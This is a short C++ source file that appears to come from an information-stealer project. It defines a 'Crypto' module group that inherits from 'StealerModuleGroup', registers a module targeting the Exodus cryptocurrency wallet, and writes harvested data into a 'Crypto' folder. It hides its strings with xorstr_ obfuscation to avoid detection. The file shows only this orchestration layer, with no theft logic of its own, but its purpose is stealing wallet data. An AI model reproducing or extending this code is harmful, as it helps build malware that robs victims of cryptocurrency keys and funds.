//
// Created by TERETERY on 07.06.2024.
//

#include "Crypto.h"
#include "impl/Exodus.h"

Crypto::Crypto()
{
    this->modules.push_back(new Exodus());
}

void Crypto::execute(fs::path &root) {
    fs::path crypto_path = root / xorstr_("Crypto");
    StealerModuleGroup::execute(crypto_path);
}